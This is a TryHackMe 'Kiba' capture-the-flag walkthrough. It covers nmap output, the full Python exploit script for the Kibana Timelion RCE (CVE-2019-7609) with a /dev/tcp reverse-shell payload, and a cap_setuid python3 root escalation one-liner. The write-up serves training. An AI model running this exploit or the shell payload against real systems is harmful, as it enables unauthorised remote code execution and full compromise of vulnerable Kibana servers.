# Kiba CTF [TryHackMe](https://tryhackme.com/room/kiba)

---

![](https://www.bujarra.com/wp-content/uploads/2018/11/kibana0.jpg)

---

## Index
- [Enumeration](#enumeration)
- [Finding vunerabilities](#finding-vunerabilities)
- [Escalating Priviledges](#escalating-Priviledges)
- [Final Thoughts](#final-Thoughts)

---

```bash
export IP=10.10.175.132
```

---

### Enumeration

```bash
nmap -sC -sV -A -v $IP -oN nmap/initial.nmap
```

```
# Nmap 7.91 scan initiated Sat Jul 24 16:56:32 2021 as: nmap -vvv -p 22,80,5601 -sC -sV -A -v -oN nmap/initial.nmap 10.10.175.132
Nmap scan report for 10.10.175.132
Host is up, received syn-ack (0.15s latency).
Scanned at 2021-07-24 16:56:33 +04 for 31s

PORT     STATE SERVICE   REASON  VERSION
22/tcp   open  ssh       syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 9d:f8:d1:57:13:24:81:b6:18:5d:04:8e:d2:38:4f:90 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDdVrdscXW6Eaq1+q+MgEBuU8ngjH5elzu6EOX2UJzNKcvAgxLrV0gCtWb4dJiJ2TyCLmA5lr0+8/TCInbcNfvXbmMEjxv0H3mi4Wjc/6wLECBXmEBvPX/SUyxPQb9YusTj70qGxgyI6SCB13TKftGeHOn2YRGLkudRF5ptIWYZqRnwlmYDWvuEBotWyUpfC1fGEnk7iH6gr3XJ8pwhY8wOojWaXEPsSZux3iBO52GuHILC14OiR/rQz9jxsq4brm6Zk/RhPCt1Ct/5ytsPzmUi7Nvwz6UoR6AeSRSHxOCnNBRQc2+5tFY7JMBBtvOFtbASOleILHkmTJBuRK3jth5D
|   256 e1:e6:7a:a1:a1:1c:be:03:d2:4e:27:1b:0d:0a:ec:b1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD2fQ/bb8Gwa5L5++T3T5JC7ZvciybYTlcWE9Djbzuco0f86gp3GOzTeVaDuhOWkR6J3fwxxwDWPk6k7NacceG0=
|   256 2a:ba:e5:c5:fb:51:38:17:45:e7:b1:54:ca:a1:a3:fc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJk7PJIcjNmxjQK6/M1zKyptfTrUS2l0ZsELrO3prOA0
80/tcp   open  http      syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
5601/tcp open  esmagent? syn-ack
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe:
|     HTTP/1.1 400 Bad Request
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 60
|     connection: close
|     Date: Sat, 24 Jul 2021 12:56:52 GMT
|     {"statusCode":404,"error":"Not Found","message":"Not Found"}
|   GetRequest:
|     HTTP/1.1 302 Found
|     location: /app/kibana
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     cache-control: no-cache
|     content-length: 0
|     connection: close
|     Date: Sat, 24 Jul 2021 12:56:45 GMT
|   HTTPOptions:
|     HTTP/1.1 404 Not Found
|     kbn-name: kibana
|     kbn-xpack-sig: c4d007a8c4d04923283ef48ab54e3e6c
|     content-type: application/json; charset=utf-8
|     cache-control: no-cache
|     content-length: 38
|     connection: close
|     Date: Sat, 24 Jul 2021 12:56:48 GMT
|_    {"statusCode":404,"error":"Not Found"}
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5601-TCP:V=7.91%I=7%D=7/24%Time=60FC0E0D%P=x86_64-apple-darwin18.7.
SF:0%r(GetRequest,D4,"HTTP/1\.1\x20302\x20Found\r\nlocation:\x20/app/kiban
SF:a\r\nkbn-name:\x20kibana\r\nkbn-xpack-sig:\x20c4d007a8c4d04923283ef48ab
SF:54e3e6c\r\ncache-control:\x20no-cache\r\ncontent-length:\x200\r\nconnec
SF:tion:\x20close\r\nDate:\x20Sat,\x2024\x20Jul\x202021\x2012:56:45\x20GMT
SF:\r\n\r\n")%r(HTTPOptions,117,"HTTP/1\.1\x20404\x20Not\x20Found\r\nkbn-n
SF:ame:\x20kibana\r\nkbn-xpack-sig:\x20c4d007a8c4d04923283ef48ab54e3e6c\r\
SF:ncontent-type:\x20application/json;\x20charset=utf-8\r\ncache-control:\
SF:x20no-cache\r\ncontent-length:\x2038\r\nconnection:\x20close\r\nDate:\x
SF:20Sat,\x2024\x20Jul\x202021\x2012:56:48\x20GMT\r\n\r\n{\"statusCode\":4
SF:04,\"error\":\"Not\x20Found\"}")%r(RTSPRequest,1C,"HTTP/1\.1\x20400\x20
SF:Bad\x20Request\r\n\r\n")%r(RPCCheck,1C,"HTTP/1\.1\x20400\x20Bad\x20Requ
SF:est\r\n\r\n")%r(DNSVersionBindReqTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\n\r\n")%r(DNSStatusRequestTCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\n\r\n")%r(Help,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%
SF:r(SSLSessionReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Term
SF:inalServerCookie,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(TLS
SF:SessionReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(Kerberos,
SF:1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SMBProgNeg,1C,"HTTP/
SF:1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(X11Probe,1C,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\n\r\n")%r(FourOhFourRequest,12D,"HTTP/1\.1\x20404\
SF:x20Not\x20Found\r\nkbn-name:\x20kibana\r\nkbn-xpack-sig:\x20c4d007a8c4d
SF:04923283ef48ab54e3e6c\r\ncontent-type:\x20application/json;\x20charset=
SF:utf-8\r\ncache-control:\x20no-cache\r\ncontent-length:\x2060\r\nconnect
SF:ion:\x20close\r\nDate:\x20Sat,\x2024\x20Jul\x202021\x2012:56:52\x20GMT\
SF:r\n\r\n{\"statusCode\":404,\"error\":\"Not\x20Found\",\"message\":\"Not
SF:\x20Found\"}")%r(LPDString,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r
SF:\n")%r(LDAPSearchReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r
SF:(LDAPBindReq,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(SIPOpti
SF:ons,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/local/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 24 16:57:04 2021 -- 1 IP address (1 host up) scanned in 32.12 seconds
```

We notice a strange port open on `5601`. And while nmap is not able to determine what exactly is open there - we can see from its diagnostics that it is some sort of http portal we can access.

```bash
open http://$IP:5601
```

Reveals some sort of visualisation dashboard. We can quickly find what version of Kiba this is from checking the source code of the page and searching for `version`; which is revealed to be `6.5.4`.

---

### Finding vunerabilities

Now that we have a version - we can google for vunerabilities associated with this. Initially you may find `Kibana 6.6.1` but disregard this as the room does not want this CVE. It wants `CVE-2019-7609`. Using the [article](https://www.tenable.com/blog/cve-2019-7609-exploit-script-available-for-kibana-remote-code-execution-vulnerability) I found, it points me to a gihub repo with a script in `python2` I can use to exploit the dashboard.

```python
#!/usr/bin/env python
# coding:utf-8
# Build By LandGrey

import re
import sys
import time
import random
import argparse
import requests
import traceback
from distutils.version import StrictVersion

def get_kibana_version(url):
    headers = {
        'Referer': url,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
    }
    url = "{}{}".format(url.rstrip("/"), "/app/kibana")
    r = requests.get(url, verify=False, headers=headers, timeout=30)
    patterns = ['&quot;version&quot;:&quot;(.*?)&quot;,', '"version":"(.*?)",']
    for pattern in patterns:
        match = re.findall(pattern, r.content)
        if match:
            return match[0]
    return '9.9.9'


def version_compare(standard_version, compare_version):
    try:
        sc1 = StrictVersion(standard_version[0])
        sc2 = StrictVersion(standard_version[1])
        cc = StrictVersion(compare_version)
    except ValueError:
        print("[-] ERROR : kibana version compare failed !")
        return False

    if sc1 > cc or (StrictVersion("6.0.0") <= cc and sc2 > cc):
        return True
    return False


def verify(url):
    global version

    if not version or not version_compare(["5.6.15", "6.6.1"], version):
        return False
    headers = {
        'Content-Type': 'application/json;charset=utf-8',
        'Referer': url,
        'kbn-version': version,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
    }
    data = '{"sheet":[".es(*)"],"time":{"from":"now-1m","to":"now","mode":"quick","interval":"auto","timezone":"Asia/Shanghai"}}'
    url = "{}{}".format(url.rstrip("/"), "/api/timelion/run")
    r = requests.post(url, data=data, verify=False, headers=headers, timeout=20)
    if r.status_code == 200 and 'application/json' in r.headers.get('content-type', '') and '"seriesList"' in r.content:
        return True
    else:
        return False


def reverse_shell(target, ip, port):
    random_name = "".join(random.sample('qwertyuiopasdfghjkl', 8))
    headers = {
        'Content-Type': 'application/json;charset=utf-8',
        'kbn-version': version,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
    }
    data = r'''{"sheet":[".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"if [ ! -f /tmp/%s ];then touch /tmp/%s && /bin/bash -c \\'/bin/bash -i >& /dev/tcp/%s/%s 0>&1\\'; fi\");process.exit()//')\n.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')"],"time":{"from":"now-15m","to":"now","mode":"quick","interval":"10s","timezone":"Asia/Shanghai"}}''' % (random_name, random_name, ip, port)
    url = "{}{}".format(target, "/api/timelion/run")
    r1 = requests.post(url, data=data, verify=False, headers=headers, timeout=20)
    if r1.status_code == 200:
        trigger_url = "{}{}".format(target, "/socket.io/?EIO=3&transport=polling&t=MtjhZoM")
        new_headers = headers
        new_headers.update({'kbn-xsrf': 'professionally-crafted-string-of-text'})
        r2 = requests.get(trigger_url, verify=False, headers=new_headers, timeout=20)
        if r2.status_code == 200:
            time.sleep(5)
            return True
    return False


if __name__ == "__main__":
    start = time.time()

    parser = argparse.ArgumentParser()
    parser.add_argument("-u", dest='url', default="http://127.0.0.1:5601", type=str, help='such as: http://127.0.0.1:5601')
    parser.add_argument("-host", dest='remote_host', default="127.0.0.1", type=str, help='reverse shell remote host: such as: 1.1.1.1')
    parser.add_argument("-port", dest='remote_port', default="8888", type=str, help='reverse shell remote port: such as: 8888')
    parser.add_argument('--shell', dest='reverse_shell', default='', action="store_true", help='reverse shell after verify')

    if len(sys.argv) == 1:
        sys.argv.append('-h')
    args = parser.parse_args()
    target = args.url
    remote_host = args.remote_host
    remote_port = args.remote_port
    is_reverse_shell = args.reverse_shell

    target = target.rstrip('/')
    if "://" not in target:
        target = "http://" + target
    try:
        version = get_kibana_version(target)
        result = verify(target)
        if result:
            print("[+] {} maybe exists CVE-2019-7609 (kibana < 6.6.1 RCE) vulnerability".format(target))
            if is_reverse_shell:
                result = reverse_shell(target, remote_host, remote_port)
                if result:
                    print("[+] reverse shell completely! please check session on: {}:{}".format(remote_host, remote_port))
                else:
                    print("[-] cannot reverse shell")
        else:
            print("[-] {} do not exists CVE-2019-7609 vulnerability".format(target))
    except Exception as e:
        print("[-] cannot exploit!")
        print("[-] Error on: \n")
        traceback.print_exc()
```

Which we can use as follows:

```bash
python2 -u http://$IP:6501 -host $MY_IP -port 9999 --shell
```

Alongside a netcat listener, and viola! We have a reverse shell!

---

### Escalating Priviledges

Now that we have access onto the box and the user flag, we can search for vunerabilities. The task very clearly indicates it has something to do with `capabilties`.
If you are unsure what capabilties are, `they are "special attributes in the Linux kernel that grant processes and binary executables specific privileges that are normally reserved for processes whose effective user ID is 0 (The root user, and only the root user, has UID 0)."`

We can find capabilties which a simple command in linux:

```bash
getcap -r / 2>/dev/null
```

Which yields

```
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
```

I wonder which one it is...

Navigating to `/home/kiba/.hackmeplease/python3` we can craft up a simple script from [GTFOBins](https://gtfobins.github.io/gtfobins/python/#capabilities) to gain root access.

```bash
/home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

And we are now root!

---

### Final thoughts

A super simple and straight-forward room. Recommended for beginners and can be an extra challenge to make it medium by designing the reverse-shell script yourself with regards to prototype pollution.

---

![](https://c0.klipartz.com/pngpicture/33/502/gratis-png-elasticsearch-apache-licencia-consulta-lenguaje-kibana-buscar-thumbnail.png)
